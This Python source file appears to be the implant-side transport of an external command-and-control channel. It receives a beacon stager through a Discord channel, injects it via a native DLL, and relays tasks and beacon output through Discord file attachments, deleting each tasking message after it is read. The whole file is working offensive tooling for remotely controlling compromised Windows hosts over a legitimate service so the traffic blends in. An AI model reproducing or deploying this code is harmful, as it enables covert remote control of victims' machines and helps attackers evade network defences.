import discord
import sys
import os
import base64
import urllib
from time import sleep
from ctypes import *
from ctypes.wintypes import *
import uuid

# Discord bot token
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_ID = os.getenv('COMMAND_CHANNEL_ID')

beaconId = str(uuid.uuid4())
taskKeyName = beaconId + ':TaskForYou'
respKeyName = beaconId + ':RespForYou'

# Initialize Discord client
intents = discord.Intents.all()
client = discord.Client(intents=intents)

maxlen = 1024 * 1024
lib = CDLL('c2file.dll')

#####################
# Helper Functions  #
#####################

def writeToBinFile(data, fileName):
    """
    Write data to a .bin file.
    """
    with open(fileName, 'wb') as f:
        f.write(data)

def readFromBinFile(fileName):
    """
    Read binary data from a .bin file.
    """
    with open(fileName, 'rb') as f:
        return f.read()

#######################
# Transport functions #
#######################

async def prepTransport():
    await client.wait_until_ready()
    return 0

async def sendData(data):
    """
    Function to send binary data to the external C2 as a .bin file.
    """
    channel = client.get_channel(int(CHANNEL_ID))
    if channel:
        fileName = f'{respKeyName}.bin'
        
        # Write data to a binary file
        writeToBinFile(data, fileName)

        # Send the binary file to the Discord channel
        file = discord.File(fileName, filename=fileName)
        await channel.send(file=file)
        print(f'Sent {len(data)} bytes to Discord.')
        os.remove(fileName)  # Clean up after sending

async def recvData():
    """
    Function to receive binary data from the external C2 by reading .bin files from Discord messages.
    """
    channel = client.get_channel(int(CHANNEL_ID))
    if channel:
        while True:
            async for message in channel.history(limit=10):
                for attachment in message.attachments:
                    if attachment.filename.startswith(f'{taskKeyName}'):
                        # Download the binary file
                        fileName = attachment.filename
                        await attachment.save(fileName)
                        
                        # Read the binary data from the file
                        data = readFromBinFile(fileName)
                        os.remove(fileName)  # Clean up the file
                        await message.delete()  # Delete the message after receiving the file
                        return [data]
            sleep(5)

async def registerClient():
    """
    Function to register a new beacon with the C2.
    """
    channel = client.get_channel(int(CHANNEL_ID))
    keyName = f"AGENT:{beaconId}"
    await channel.send(f'{keyName}')
    print(f"[+] Registered new {keyName}")

#####################
# Interaction logic #
#####################

lib.start_beacon.argtypes = [c_char_p, c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
    return lib.start_beacon(payload, len(payload))

lib.read_frame.argtypes = [POINTER(HANDLE), c_char_p, c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
    mem = create_string_buffer(maxlen)
    l = lib.read_frame(hPipe, mem, maxlen)
    if l < 0:
        return -1
    chunk = mem.raw[:l]
    return chunk

lib.write_frame.argtypes = [POINTER(HANDLE), c_char_p, c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe, chunk):
    sys.stdout.write(f'wp: {len(chunk)}\n')
    sys.stdout.flush()
    ret = lib.write_frame(hPipe, c_char_p(chunk), c_int(len(chunk)))
    sleep(3)
    print(f"ret={ret}")
    return ret

async def go():
    # Register beaconId so C2 server knows we're waiting
    await registerClient()
    print("Waiting for stager...")  # DEBUG

    # # Send READY2INJECT message to indicate readiness
    # channel = client.get_channel(int(CHANNEL_ID))
    # await channel.send("READY2INJECT")  # Notify the server that we are ready
    # print("Sent READY2INJECT message to the server.")

    # Wait for stager data
    p = await recvData()
    p = p[0]
    print("Got a stager! loading...")
    sleep(2)
    handle_beacon = start_beacon(p)
    print("Loaded, and got handle to beacon. Getting METADATA.")
    return handle_beacon

async def interact(handle_beacon):
    while True:
        sleep(1.5)
        chunk = ReadPipe(handle_beacon)
        if chunk < 0:
            print(f'readpipe {len(chunk)}')
            break
        else:
            print(f"Received {len(chunk)} bytes from pipe")
        print("Relaying chunk to server")
        await sendData(chunk)

        print("Checking for new tasks from transport")
        newTasks = await recvData()
        for newTask in newTasks:
            print(f"Got new task: {newTask}")
            print(f"Writing {len(newTask)} bytes to pipe")
            r = WritePipe(handle_beacon, newTask)
            print(f"Write {r} bytes to pipe")

# Prepare the transport module and start the bot
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    handle_beacon = await go()
    try:
        await interact(handle_beacon)
    except KeyboardInterrupt:
        print("Caught escape signal")
        sys.exit(0)

client.run(DISCORD_TOKEN)